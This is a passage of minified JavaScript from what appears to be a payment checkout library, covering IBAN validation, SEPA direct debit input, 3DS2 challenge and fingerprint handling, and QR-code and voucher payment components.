,ST:{length:25,structure:"F08F11F02",example:"ST68000100010051845310112"},TL:{length:23,structure:"F03F14F02",example:"TL380080012345678910157"},TN:{length:24,structure:"F02F03F13F02",example:"TN5910006035183598478831"},TR:{length:26,structure:"F05F01A16",example:"TR330006100519786457841326"},VG:{length:24,structure:"U04F16",example:"VG96VPVG0000012345678901"},XK:{length:20,structure:"F04F10F02",example:"XK051212012345678906"},AO:{length:25,structure:"F21",example:"AO69123456789012345678901"},BF:{length:27,structure:"F23",example:"BF2312345678901234567890123"},BI:{length:16,structure:"F12",example:"BI41123456789012"},BJ:{length:28,structure:"F24",example:"BJ39123456789012345678901234"},CI:{length:28,structure:"U01F23",example:"CI17A12345678901234567890123"},CM:{length:27,structure:"F23",example:"CM9012345678901234567890123"},CV:{length:25,structure:"F21",example:"CV30123456789012345678901"},DZ:{length:24,structure:"F20",example:"DZ8612345678901234567890"},IR:{length:26,structure:"F22",example:"IR861234568790123456789012"},JO:{length:30,structure:"A04F22",example:"JO15AAAA1234567890123456789012"},MG:{length:27,structure:"F23",example:"MG1812345678901234567890123"},ML:{length:28,structure:"U01F23",example:"ML15A12345678901234567890123"},MZ:{length:25,structure:"F21",example:"MZ25123456789012345678901"},QA:{length:29,structure:"U04A21",example:"QA30AAAA123456789012345678901"},SN:{length:28,structure:"U01F23",example:"SN52A12345678901234567890123"},UA:{length:29,structure:"F25",example:"UA511234567890123456789012345"}},AA=function(e){return e.replace(/\W/gi,"").replace(/(.{4})(?!$)/g,"$1 ").trim()},mA=function(e){return e.replace(/[^a-zA-Z0-9]/g,"").toUpperCase()};function vA(e,t){void 0===t&&(t=null),this.status=e,this.code=t}var gA=function(e){var t=mA(e);if(e.length<2)return new vA("no-validate","TOO_SHORT");var n,r=!(!(n=t.slice(0,2))||!fA[n])&&fA[n];return r?t.length>r.length?new vA("invalid","TOO_LONG"):t.length===r.length?function(e){var t,n,r=mA(e);return 1===function(e){for(var t,n=function(e){var t=e,n="A".charCodeAt(0),r="Z".charCodeAt(0);return(t=(t=t.toUpperCase()).substr(4)+t.substr(0,4)).split("").map((function(e){var t=e.charCodeAt(0);return t>=n&&t<=r?t-n+10:e})).join("")}(r);2<n.length;)t=n.slice(0,9),n=parseInt(t,10)%97+n.slice(t.length);return parseInt(n,10)%97}()&&((n=function(e,t){if(null===t||!fA[t]||!fA[t].structure)return!1;var n=fA[t].structure.match(/(.{3})/g).map((function(e){var t,n=e.slice(0,1),r=parseInt(e.slice(1),10);switch(n){case"A":t="0-9A-Za-z";break;case"B":t="0-9A-Z";break;case"C":t="A-Za-z";break;case"F":t="0-9";break;case"L":t="a-z";break;case"U":t="A-Z";break;case"W":t="0-9a-z"}return"(["+t+"]{"+r+"})"}));return new RegExp("^"+n.join("")+"$")}(0,(t=r).slice(0,2))).test&&n.test(t.slice(4))||!1)}(e)?new vA("valid","VALID"):new vA("invalid","INVALID_IBAN"):new vA("no-validate","UNKNOWN"):new vA("invalid","INVALID_COUNTRY")},yA=function(e){return!!(e&&e.length&&0<e.length)},bA=function(e){function t(t){var n,r,i=e.call(this,t)||this;if(i.setData=function(e,t,n){i.setState((function(n){var r;return{data:ml(ml({},n.data),(r={},r[e]=t,r))}}),n)},i.setError=function(e,t,n){i.setState((function(n){var r;return{errors:ml(ml({},n.errors),(r={},r[e]=t,r))}}),n)},i.setValid=function(e,t,n){i.setState((function(n){var r;return{valid:ml(ml({},n.valid),(r={},r[e]=t,r))}}),n)},i.handleHolderInput=function(e){i.setState((function(t){return{data:ml(ml({},t.data),{"sepa.ownerName":e})}}),(function(){i.setError("holder",!yA(i.state.data["sepa.ownerName"])),i.onChange()}))},i.handleIbanInput=function(e){var t=e.target.value,n=mA(t),r=AA(n),a=gA(r).status,o=e.target.selectionStart,s=i.state.data["sepa.ibanNumber"],l=function(e,t,n){if(0===e||!t.length)return 0;var r=t.length-n.length,i=0<r,a=function(e,t){return/\s/.test(e.charAt(t))},o=e-r;return i&&(a(t,o+1)||a(t,o))?e+1:!i&&a(t,e-1)?e-1:e}(o,r,s);i.setState((function(e){return{data:ml(ml({},e.data),{"sepa.ibanNumber":r}),errors:ml(ml({},e.errors),{iban:"invalid"===a?"sepaDirectDebit.ibanField.invalid":null}),valid:ml(ml({},e.valid),{iban:"valid"===a})}}),(function(){e.target.setSelectionRange(l,l),i.onChange()}))},i.handleIbanBlur=function(e){var t=e.target.value;if(0<t.length){var n=gA(t).status;i.setError("iban","valid"!==n?"sepaDirectDebit.ibanField.invalid":null)}},i.state={status:"ready",data:{"sepa.ownerName":(null===(n=null==t?void 0:t.data)||void 0===n?void 0:n.ownerName)||"","sepa.ibanNumber":(null===(r=null==t?void 0:t.data)||void 0===r?void 0:r.ibanNumber)||""},isValid:!1,cursor:0,errors:{},valid:{}},i.state.data["sepa.ibanNumber"]){var a=mA(i.state.data["sepa.ibanNumber"]);i.state.data["sepa.ibanNumber"]=AA(a)}if(i.state.data["sepa.ibanNumber"]||i.state.data["sepa.ownerName"]){var o=i.props.holderName?yA(i.state.data["sepa.ownerName"]):"",s=(i.state.data["sepa.ibanNumber"]?"valid"===gA(i.state.data["sepa.ibanNumber"]).status:"")&&o,l={data:i.state.data,isValid:s};i.props.onChange(l)}return i}return Al(t,e),t.prototype.setStatus=function(e){this.setState({status:e})},t.prototype.onChange=function(){var e=this.props.holderName?yA(this.state.data["sepa.ownerName"]):"",t="valid"===gA(this.state.data["sepa.ibanNumber"]).status&&e,n={data:this.state.data,isValid:t};this.props.onChange(n)},t.prototype.showValidation=function(){var e=gA(this.state.data["sepa.ibanNumber"]).status,t=yA(this.state.data["sepa.ownerName"]);this.setError("iban","valid"!==e?"sepaDirectDebit.ibanField.invalid":null),this.setError("holder",!t||null)},t.prototype.render=function(e,t){var n,r=this,i=e.placeholders,a=e.countryCode,o=t.data,s=t.errors,l=t.valid,c=Xc().i18n;return Hl("div",{className:"adyen-checkout__iban-input"},this.props.holderName&&Hl(mu,{className:"adyen-checkout__field--owner-name",label:c.get("sepa.ownerName"),filled:o["sepa.ownerName"]&&o["sepa.ownerName"].length,errorMessage:!!s.holder&&c.get("creditCard.holderName.invalid"),dir:"ltr"},Lu("text",{name:"sepa.ownerName",className:"adyen-checkout__iban-input__owner-name",placeholder:"ownerName"in i?i.ownerName:c.get("sepaDirectDebit.nameField.placeholder"),value:o["sepa.ownerName"],"aria-invalid":!!this.state.errors.holder,"aria-label":c.get("sepa.ownerName"),onInput:function(e){return r.handleHolderInput(e.target.value)}})),Hl(mu,{className:"adyen-checkout__field--iban-number",label:c.get("sepa.ibanNumber"),errorMessage:!!s.iban&&c.get(s.iban),filled:o["sepa.ibanNumber"]&&o["sepa.ibanNumber"].length,isValid:l.iban,onBlur:this.handleIbanBlur,dir:"ltr"},Lu("text",{ref:function(e){r.ibanNumber=e},name:"sepa.ibanNumber",className:"adyen-checkout__iban-input__iban-number",classNameModifiers:["large"],placeholder:"ibanNumber"in i?i.ibanNumber:(n=a,void 0===n&&(n=null),n&&fA[n]&&fA[n].example?AA(fA[n].example):"AB00 1234 5678 9012 3456 7890"),value:o["sepa.ibanNumber"],onInput:this.handleIbanInput,"aria-invalid":!!this.state.errors.iban,"aria-label":c.get("sepa.ibanNumber"),autocorrect:"off",spellcheck:!1})),this.props.showPayButton&&this.props.payButton({status:this.state.status}))},t.defaultProps={onChange:function(){},countryCode:null,holderName:!0,placeholders:{}},t}(Gl),_A=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(e){return ml({holderName:!0},e)},t.prototype.formatData=function(){return{paymentMethod:{type:t.type,iban:this.state.data["sepa.ibanNumber"],ownerName:this.state.data["sepa.ownerName"]}}},Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return Hl(Xd,ml({},this.props,{loadingContext:this.props.loadingContext}),Hl(bA,ml({ref:function(t){e.componentRef=t}},this.props,{onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.type="sepadirectdebit",t}(Zc),wA=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.componentDidMount=function(){this.formEl.submit()},t.prototype.render=function(e){var t=this,n=e.name,r=e.action,i=e.target,a=e.inputName,o=e.inputValue;return Hl("form",{ref:function(e){t.formEl=e},method:"POST",className:Cc(["adyen-checkout__threeds2__form","adyen-checkout__threeds2__form--"+n]),name:n,action:r,target:i,style:{display:"none"}},Hl("input",{name:a,value:o}))},t}(Gl),CA={result:{transStatus:"U"},type:"challengeResult"},xA={result:{transStatus:"U"},type:"challengeResult",errorCode:"timeout"},SA={result:{threeDSCompInd:"N"},type:"fingerPrintResult"},kA={result:{threeDSCompInd:"N"},type:"fingerPrintResult",errorCode:"timeout"},MA={timeout:"ThreeDS2 timed out",wrongOrigin:"Result came in the right format but not from the expected origin",HTMLElementError:"No proper HTML element was passed",wrongDataType:"Result data was not of the expected type",missingProperty:"Result data did not contain the expected properties",unknownError:"An unknown error occurred"},BA={"01":["250px","400px"],"02":["390px","400px"],"03":["500px","600px"],"04":["600px","400px"],"05":["100%","100%"]},EA=function(e){var t=pu.decode(e);try{return t&&JSON.parse(t)}catch(e){throw new Error("Could not decode token")}},TA=function(e){if(!e||!Object.keys(e).length)throw new Error("No (populated) data object to encode");return pu.encode(JSON.stringify(e))},PA=function(e){var t=1===e.length?"0"+e:e;return Object.prototype.hasOwnProperty.call(BA,t)?t:"02"},IA=function(e){return{errorCode:e,message:MA[e]||MA.unknownError}},FA=function(e){var t=window.btoa(e).split("=")[0];return(t=t.replace(/\+/g,"-")).replace(/\//g,"_")},LA=["elementRef"],OA=["createFromAction","onAdditionalDetails"],NA="threeDSIframe",DA=function(e){function t(t){var n=e.call(this,t)||this;n.iframeCallback=function(){n.setState({status:"iframeLoaded"})};var r=JSON.stringify(n.props.cReqData),i=FA(r);return n.state={base64URLencodedData:i},n}return Al(t,e),t.prototype.get3DS2ChallengePromise=function(){var e=this;return new Promise((function(t,n){e.processMessageHandler=ou(e.props.postMessageDomain,t,n,CA,"challengeResult"),window.addEventListener("message",e.processMessageHandler)}))},t.prototype.componentDidMount=function(){var e=this;this.challengePromise=tu(6e5,this.get3DS2ChallengePromise(),xA),this.challengePromise.promise.then((function(t){window.removeEventListener("message",e.processMessageHandler),e.props.onCompleteChallenge(t)})).catch((function(t){window.removeEventListener("message",e.processMessageHandler),e.props.onErrorChallenge(t)}))},t.prototype.componentWillUnmount=function(){this.challengePromise&&this.challengePromise.cancel(),window.removeEventListener("message",this.processMessageHandler)},t.prototype.render=function(e,t){var n=e.acsURL,r=e.cReqData,i=e.iframeSizeArr,a=t.base64URLencodedData,o=t.status,s=i[0],l=i[1];return Hl("div",{className:Cc(["adyen-checkout__threeds2__challenge","adyen-checkout__threeds2__challenge--"+r.challengeWindowSize])},"iframeLoaded"!==o&&Hl(xc,null),Hl(eu,{name:NA,width:s,height:l,callback:this.iframeCallback}),Hl(wA,{name:"cReqForm",action:n,target:NA,inputName:"creq",inputValue:a}))},t}(Gl),RA=function(e){function t(t){var n,r,i,a,o,s,l,c,u,d,p=e.call(this,t)||this;if(p.props.token){var h=(i=(n={token:p.props.token,size:p.props.challengeWindowSize||p.props.size}).size,o=(a=EA(n.token)).acsTransID,s=a.acsURL,l=a.messageVersion,c=a.threeDSNotificationURL,u=a.threeDSServerTransID,d=su(c),{acsURL:s,cReqData:{acsTransID:o,messageVersion:l,threeDSServerTransID:u,messageType:"CReq",challengeWindowSize:PA(i)},iframeSizeArr:(r=i,BA[PA(r)]),postMessageDomain:d});p.state={status:"retrievingChallengeToken",challengeData:h}}else p.state={status:"error"},p.props.onError("Missing challengeToken parameter");return p}return Al(t,e),t.prototype.setStatusComplete=function(e){var t=this;this.setState({status:"complete"},(function(){var n=(t.props.useOriginalFlow?function(e,t,n){return{data:{details:{"threeds2.challengeResult":TA({transStatus:t})},paymentData:n}}}:function(e,t,n){var r;return{data:{details:(r={},r[e]=TA({transStatus:t,authorisationToken:n}),r)}}})(t.props.dataKey,e.transStatus,t.props.paymentData);t.props.onComplete(n)}))},t.prototype.render=function(e,t){var n=this,r=t.challengeData;return"retrievingChallengeToken"===this.state.status?Hl(DA,ml({onCompleteChallenge:function(e){n.setStatusComplete(e.result)},onErrorChallenge:function(e){var t=IA(e.errorCode);n.props.onError(t),n.setStatusComplete(e.result)}},r)):null},t.defaultProps={onComplete:function(){},onError:function(){}},t}(Gl),jA=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.render=function(){return Xp(this.props.paymentData)?Hl(RA,ml({},this.props,{onComplete:this.onComplete})):(this.props.onError({errorCode:"threeds2.challenge",message:"No paymentData received. Challenge cannot proceed"}),null)},t.type="threeDS2Challenge",t.defaultProps={dataKey:"threeDSResult",size:"02",type:"ChallengeShopper"},t}(Zc),UA="threeDSMethodIframe",$A=function(e){function t(t){var n=e.call(this,t)||this,r=n.props,i=r.threeDSServerTransID,a=r.threeDSMethodNotificationURL,o=JSON.stringify({threeDSServerTransID:i,threeDSMethodNotificationURL:a}),s=FA(o);return n.state={base64URLencodedData:s},n}return Al(t,e),t.prototype.get3DS2MethodPromise=function(){var e=this;return new Promise((function(t,n){e.processMessageHandler=ou(e.props.postMessageDomain,t,n,SA,"fingerPrintResult"),window.addEventListener("message",e.processMessageHandler)}))},t.prototype.componentDidMount=function(){var e=this;this.fingerPrintPromise=tu(1e4,this.get3DS2MethodPromise(),kA),this.fingerPrintPromise.promise.then((function(t){window.removeEventListener("message",e.processMessageHandler),e.props.onCompleteFingerprint(t)})).catch((function(t){window.removeEventListener("message",e.processMessageHandler),e.props.onErrorFingerprint(t)}))},t.prototype.componentWillUnmount=function(){this.fingerPrintPromise&&this.fingerPrintPromise.cancel(),window.removeEventListener("message",this.processMessageHandler)},t.prototype.render=function(e,t){var n=e.threeDSMethodURL,r=t.base64URLencodedData;return Hl("div",{className:"adyen-checkout__3ds2-device-fingerprint"},this.props.showSpinner&&Hl(xc,null),Hl("div",{style:{display:"none"}},Hl(eu,{name:UA}),Hl(wA,{name:"threeDSMethodForm",action:n,target:UA,inputName:"threeDSMethodData",inputValue:r})))},t.defaultProps={showSpinner:!0},t}(Gl),zA=function(e){function t(t){var n,r,i,a,o,s,l=e.call(this,t)||this,c=l.props,u=c.token,d=c.notificationURL;if(u){var p=(r=(n={token:u,notificationURL:d}).notificationURL,a=(i=EA(n.token)).threeDSMethodNotificationURL,o=i.threeDSMethodUrl,s=r||a,{threeDSServerTransID:i.threeDSServerTransID,threeDSMethodURL:o,threeDSMethodNotificationURL:s,postMessageDomain:su(s)});l.state={status:"init",fingerPrintData:p}}else l.state={status:"error"},l.props.onError("Missing fingerprintToken parameter");return l}return Al(t,e),t.prototype.componentDidMount=function(){this.state.fingerPrintData&&this.state.fingerPrintData.threeDSMethodURL&&this.state.fingerPrintData.threeDSMethodURL.length?this.setState({status:"retrievingFingerPrint"}):this.setStatusComplete({threeDSCompInd:"U"})},t.prototype.setStatusComplete=function(e){var t=this;this.setState({status:"complete"},(function(){var n=(t.props.useOriginalFlow?function(e,t,n){return{data:{details:{"threeds2.fingerprint":TA(t)},paymentData:n}}}:function(e,t,n){var r;return{data:(r={},r[e]=TA({threeDSCompInd:t.threeDSCompInd}),r.paymentData=n,r)}})(t.props.dataKey,e,t.props.paymentData);t.props.onComplete(n)}))},t.prototype.render=function(e,t){var n=this,r=t.fingerPrintData;return"retrievingFingerPrint"===this.state.status?Hl($A,ml({onCompleteFingerprint:function(e){n.setStatusComplete(e.result)},onErrorFingerprint:function(e){var t=IA(e.errorCode);n.props.onError(t),n.setStatusComplete(e.result)},showSpinner:this.props.showSpinner},r)):null},t.type="scheme",t.defaultProps={onComplete:function(){},onError:function(){},paymentData:"",showSpinner:!0},t}(Gl),HA=function(e){function t(){var t=null!==e&&e.apply(this,arguments)||this;return t.callSubmit3DS2Fingerprint=function(e){var t=this,n=e.data;Ud({path:"v1/submitThreeDS2Fingerprint?token="+this.props.clientKey,loadingContext:this.props.loadingContext},ml({},n)).then((function(e){var n,r,i,a=null!==(n=t.props.elementRef)&&void 0!==n?n:t;if(e.action||e.details){if("completed"!==e.type)return"threeDS2"===(null===(r=e.action)||void 0===r?void 0:r.type)?a.handleAction(e.action,Gp("challengeWindowSize").from(t.props)):"redirect"===(null===(i=e.action)||void 0===i?void 0:i.type)?a.handleAction(e.action):void 0;var o=e.details;return t.onComplete({data:{details:o}})}}))}.bind(t),t}return Al(t,e),t.prototype.render=function(){return Xp(this.props.paymentData)?Hl(zA,ml({},this.props,{onComplete:this.props.useOriginalFlow?this.onComplete:this.callSubmit3DS2Fingerprint})):(this.props.onError({errorCode:t.defaultProps.dataKey,message:"No paymentData received. Fingerprinting cannot proceed"}),null)},t.type="threeDS2Fingerprint",t.defaultProps={dataKey:"fingerprintResult",type:"IdentifyShopper"},t}(Zc),VA=function(e,t){if(void 0===t&&(t=2),0===t)return e;var n=String(e);return n.length>=t?n:("0".repeat(t)+n).slice(-1*t)},QA=function(e){function t(t){var n=e.call(this,t)||this,r=6e4*n.props.minutesFromNow,i=(new Date).getTime();return n.state={startTime:new Date(i),endTime:new Date(i+r),minutes:"-",seconds:"-"},n}return Al(t,e),t.prototype.tick=function(){var e,t,n,r,i,a,o,s,l,c=(e=this.state.startTime,t=this.state.endTime,a=new Date,s=(o=t.getTime()-a.getTime())/1e3,n=e,r=a,i=t.getTime()-n.getTime(),l=100-Math.round(100*(r.getTime()-n.getTime())/i),{total:o,minutes:VA(Math.floor(s/60%60)),seconds:VA(Math.floor(s%60)),completed:o<=0,percentage:l});if(c.completed)return this.props.onCompleted(),this.clearInterval();var u={minutes:c.minutes,seconds:c.seconds,percentage:c.percentage};return this.setState(ml({},u)),this.props.onTick(u),u},t.prototype.clearInterval=function(){clearInterval(this.interval),delete this.interval},t.prototype.componentDidMount=function(){var e=this;this.interval=setInterval((function(){e.tick()}),1e3)},t.prototype.componentWillUnmount=function(){this.clearInterval()},t.prototype.render=function(){return Hl("span",{className:"adyen-checkout__countdown"},Hl("span",{className:"countdown__minutes"},this.state.minutes),Hl("span",{className:"countdown__separator"},":"),Hl("span",{className:"countdown__seconds"},this.state.seconds))},t.defaultProps={onTick:function(){},onCompleted:function(){}},t}(Gl);function GA(e,t,n){if(!e||!t)throw new Error("Could not check the payment status");return Ud({loadingContext:n,path:"services/PaymentInitiation/v1/status?clientKey="+t},{paymentData:e})}var WA=function(e){switch(e.resultCode.toLowerCase()){case"refused":case"error":case"cancelled":return{type:"error",props:ml(ml({},e),{message:"error.subtitle.refused"})};case"unknown":return{type:"error",props:ml(ml({},e),{message:"error.message.unknown"})};case"pending":case"received":return{type:e.resultCode.toLowerCase(),props:e};case"authorised":default:return{type:"success",props:e}}},KA=function(e){if(!e.type&&e.resultCode)return WA(e);if(!e.type)return{type:"error",props:e};switch(e.type.toLowerCase()){case"pending":return{type:"pending",props:e};case"complete":return WA(e);case"validation":default:return{type:"error",props:e}}},qA=function(e){function t(t){var n=e.call(this,t)||this;return n.statusInterval=function(){n.checkStatus(),n.setState({timePassed:n.state.timePassed+n.props.delay}),n.state.timePassed>=n.props.throttleTime&&n.setState({delay:n.props.throttledInterval})},n.redirectToApp=function(e,t){void 0===t&&(t=function(){}),setTimeout((function(){n.props.onError(n.props.type+" App was not found"),t()}),25),window.location.assign(e)},n.state={buttonStatus:"default",completed:!1,delay:t.delay,expired:!1,loading:!0,onError:function(){},percentage:100,timePassed:0},n.onTimeUp=n.onTimeUp.bind(n),n.onTick=n.onTick.bind(n),n.onComplete=n.onComplete.bind(n),n.onError=n.onError.bind(n),n.checkStatus=n.checkStatus.bind(n),n}return Al(t,e),t.prototype.componentDidMount=function(){var e=this,t=this.props,n=t.shouldRedirectOnMobile,r=t.url,i=window.matchMedia("(max-width: 768px)").matches&&/Android|iPhone|iPod/.test(navigator.userAgent),a=function(){e.interval=setInterval(e.statusInterval,e.state.delay)};n&&r&&i?this.redirectToApp(r,a):a()},t.prototype.componentDidUpdate=function(e,t){t.delay!==this.state.delay&&(clearInterval(this.interval),this.interval=setInterval(this.statusInterval,this.state.delay))},t.prototype.componentWillUnmount=function(){clearInterval(this.interval)},t.prototype.onTick=function(e){this.setState({percentage:e.percentage})},t.prototype.onTimeUp=function(){return this.setState({expired:!0}),clearInterval(this.interval),this.props.onError({type:"error",props:{errorMessage:"Payment Expired"}})},t.prototype.onComplete=function(e){return clearInterval(this.interval),this.setState({completed:!0,loading:!1}),this.props.onComplete({data:{details:{payload:e.props.payload},paymentData:this.props.paymentData}}),e},t.prototype.onError=function(e){return clearInterval(this.interval),this.setState({expired:!0,loading:!1}),this.props.onComplete({data:{details:{payload:e.props.payload},paymentData:this.props.paymentData}}),e},t.prototype.checkStatus=function(){var e=this,t=this.props;return GA(t.paymentData,t.clientKey,t.loadingContext).then(KA).catch((function(e){return{type:"network-error",props:e}})).then((function(t){switch(t.type){case"success":return e.onComplete(t);case"error":return e.onError(t);default:e.setState({loading:!1})}return t}))},t.prototype.render=function(e,t){var n=this,r=e.amount,i=e.url,a=e.brandLogo,o=e.countdownTime,s=e.i18n,l=e.loadingContext,c=e.type,u=t.expired,d=t.completed,p=t.loading,h=this.props.qrCodeData?l+"barcode.shtml?barcodeType=qrCode&fileType=png&data="+this.props.qrCodeData:this.props.qrCodeImage,f=function(e,t){return Hl("div",{className:"adyen-checkout__qr-loader adyen-checkout__qr-loader--result"},Hl("img",{className:"adyen-checkout__qr-loader__icon adyen-checkout__qr-loader__icon--result",src:gc({loadingContext:l,imageFolder:"components/"})(e),alt:s.get(t)}),Hl("div",{className:"adyen-checkout__qr-loader__subtitle adyen-checkout__qr-loader__subtitle--result"},s.get(t)))};if(u)return f("error","error.subtitle.payment");if(d)return f("success","creditCard.success");if(p)return Hl("div",{className:"adyen-checkout__qr-loader"},a&&Hl("img",{alt:c,src:a,className:"adyen-checkout__qr-loader__brand-logo"}),Hl(xc,null));var A=s.get("wechatpay.timetopay").split("%@");return Hl("div",{className:"\n                    adyen-checkout__qr-loader\n                    adyen-checkout__qr-loader--"+c+"\n                    "+this.props.classNameModifiers.map((function(e){return"adyen-checkout__qr-loader--"+e}))+"\n                "},a&&Hl("img",{src:a,alt:c,className:"adyen-checkout__qr-loader__brand-logo"}),Hl("div",{className:"adyen-checkout__qr-loader__subtitle"},s.get(this.props.introduction)),Hl("img",{src:h,alt:s.get("wechatpay.scanqrcode")}),r&&r.value&&r.currency&&Hl("div",{className:"adyen-checkout__qr-loader__payment_amount"},s.amount(r.value,r.currency)),Hl("div",{className:"adyen-checkout__qr-loader__progress"},Hl("span",{className:"adyen-checkout__qr-loader__percentage",style:{width:this.state.percentage+"%"}})),Hl("div",{className:"adyen-checkout__qr-loader__countdown"},A[0]," ",Hl(QA,{minutesFromNow:o,onTick:this.onTick,onCompleted:this.onTimeUp})," ",A[1]),this.props.instructions&&Hl("div",{className:"adyen-checkout__qr-loader__instructions"},s.get(this.props.instructions)),this.props.copyBtn&&Hl("div",{className:"adyen-checkout__qr-loader__actions"},Hl(Yc,{inline:!0,secondary:!0,onClick:function(e,t){var r=t.complete;Hf(n.props.qrCodeData),r()},icon:gc({loadingContext:l,imageFolder:"components/"})("copy"),label:s.get("button.copy")})),i&&Hl("div",{className:"adyen-checkout__qr-loader__app-link"},Hl("span",{className:"adyen-checkout__qr-loader__separator__label"},s.get("or")),Hl(Yc,{classNameModifiers:["qr-loader"],onClick:function(){return n.redirectToApp(i)},label:s.get("openApp")})))},t.defaultProps={delay:2e3,countdownTime:15,onError:function(){},onComplete:function(){},throttleTime:6e4,classNameModifiers:[],throttledInterval:1e4,introduction:"wechatpay.scanqrcode"},t}(Gl),XA=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatData=function(){return{paymentMethod:ml({type:this.props.type||this.constructor.type},this.state.data)}},Object.defineProperty(t.prototype,"isValid",{get:function(){return!0},enumerable:!1,configurable:!0}),t.prototype.render=function(){var e=this;return this.props.paymentData?Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(qA,ml({ref:function(t){e.componentRef=t}},this.props,{shouldRedirectOnMobile:this.props.shouldRedirectOnMobile,type:this.constructor.type,brandLogo:this.props.brandLogo||this.icon,delay:this.props.delay,onComplete:this.onComplete,countdownTime:this.props.countdownTime,instructions:this.props.instructions}))):this.props.showPayButton?Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},Hl(Pf,{name:this.displayName,onSubmit:this.submit,payButton:this.payButton,ref:function(t){e.componentRef=t}})):null},t.defaultProps={qrCodeImage:"",amount:null,paymentData:null,onError:function(){},onComplete:function(){}},t}(Zc),YA=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){return ml({delay:2e3,countdownTime:15},e.prototype.formatProps.call(this,t))},t.type="wechatpayQR",t}(XA),JA=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.prototype.formatProps=function(t){var n=window.matchMedia("(max-width: 768px)").matches&&/Android|iPhone|iPod/.test(navigator.userAgent);return ml({delay:2e3,countdownTime:15,shouldRedirectOnMobile:!0,buttonLabel:n?"openApp":"generateQRCode"},e.prototype.formatProps.call(this,t))},t.type="bcmc_mobile",t}(XA),ZA=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.type="molpay_ebanking_fpx_MY",t}(xp),em=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.type="molpay_ebanking_TH",t}(xp),tm=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.type="molpay_ebanking_VN",t}(xp),nm=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),t.type="openbanking_UK",t}(xp);function rm(e){var t=Xc().i18n,n=function(){return-1<["dragonpay_ebanking","dragonpay_otc_banking","dragonpay_otc_non_banking"].indexOf(e.type)},r=Hu({schema:bl(bl([],n()?["issuer"]:[]),["shopperEmail"]),rules:{issuer:{validate:function(e){return n()&&!!e},modes:["input","blur"]}}}),i=r.handleChangeFor,a=r.triggerValidation,o=r.data,s=r.valid,l=r.errors,c=r.isValid,u=Cp({},e.type),d=e.items.map((function(e){return ml(ml({},e),{icon:u(e.id&&e.id.toLowerCase())})})),p=function(e){return"dragonpay_otc_non_banking"===e?"dragonpay.voucher.non.bank.selectField.placeholder":"dragonpay.voucher.bank.selectField.placeholder"};Oc((function(){e.onChange({isValid:c,data:o,valid:s,errors:l})}),[c,o,s,l]);var h=Fc("ready"),f=h[0],A=h[1];return this.setStatus=A,this.showValidation=a,Hl("div",{className:"adyen-checkout__dragonpay-input__field"},Hl(mu,{label:t.get("shopperEmail"),errorMessage:!!l.shopperEmail},Lu("emailAddress",{name:"dragonpay.shopperEmail",autoCorrect:"off",value:o.shopperEmail,className:"adyen-checkout__input--large",spellCheck:!1,onInput:i("shopperEmail","input"),onChange:i("shopperEmail","blur")})),n()&&Hl(mu,{label:t.get(p(e.type)),errorMessage:!!l.issuer},Lu("select",{items:d,selected:o.issuer,placeholder:t.get(p(e.type)),name:"issuer",className:"adyen-checkout__dropdown--large adyen-checkout__issuer-list__dropdown",onChange:i("issuer")})),e.showPayButton&&e.payButton({status:f,label:t.get("confirmPurchase")}))}function im(e){var t=e.reference,n=e.totalAmount,r=e.surcharge,i=e.expiresAt,a=e.alternativeReference,o=e.instructionsUrl,s=e.icon,l=e.issuer,c=e.paymentMethodType,u=Xc(),d=u.loadingContext,p=u.i18n,h=Cp({loadingContext:d},c)(l.toLowerCase());return Hl(Vf,{reference:t,paymentMethodType:c,introduction:p.get("voucher.introduction"),imageUrl:s,issuerImageUrl:h,instructionsUrl:o,amount:n&&p.amount(n.value,n.currency),surcharge:r&&p.amount(r.value,r.currency),voucherDetails:[{label:p.get("voucher.expirationDate"),value:p.date(i)},{label:p.get("voucher.alternativeReference"),value:a}],copyBtn:!0})}rm.defaultProps={data:{},items:[],onChange:function(){}};var am=function(e){function t(){return null!==e&&e.apply(this,arguments)||this}return Al(t,e),Object.defineProperty(t.prototype,"isValid",{get:function(){return!!this.state.isValid},enumerable:!1,configurable:!0}),t.prototype.formatData=function(){var e=this.state.data,n=e.issuer,r=e.shopperEmail;return ml(ml({},r&&{shopperEmail:r}),{paymentMethod:ml(ml({},n&&{issuer:n}),{type:this.props.type||t.type})})},t.prototype.formatProps=function(e){var t,n,r;return ml(ml({},e),{issuers:null!==(r=null===(n=null===(t=e.details)||void 0===t?void 0:t.find((function(e){return"issuer"===e.key})))||void 0===n?void 0:n.items)&&void 0!==r?r:e.issuers})},t.prototype.render=function(){var e=this;return Hl(Xd,{i18n:this.props.i18n,loadingContext:this.props.loadingContext},this.props.reference?Hl(im,ml({ref:function(t){e.componentRef=t},icon:this.icon},this.props)):Hl(rm,ml({ref:function(t){e.componentRef=t},items:this.props.issuers},this.props,{onChange:this.setState,onSubmit:this.submit,payButton:this.payButton})))},t.type="dragonpay",t}(Zc);function om(e){var t=Dc(null),n=Xc().i18n,r=Fc("ready"),i=r[0],a=r[1];return this.setStatus=a,this.showValidation=function(){t.current&&t.current.showValidation()},Hl("div",{className:"adyen-checkout__doku-input__field"},Hl(td,{data:e.data,requiredFields:["firstName","lastName","shopperEmail"],onChange:e.onChange,namePrefix:"doku",ref:t}),e.showPayButton&&e.payButton({status:i,label:n.get("confirmPurchase")}))}var sm=function(e){var t=e.reference,n=e.expiresAt,r=e.instructionsUrl,i=e.shopperName,a=e.merchantName,o=e.totalAmount,s=e.paymentMethodType,l=Xc(),c=l.loadingContext,u=l.i18n;return 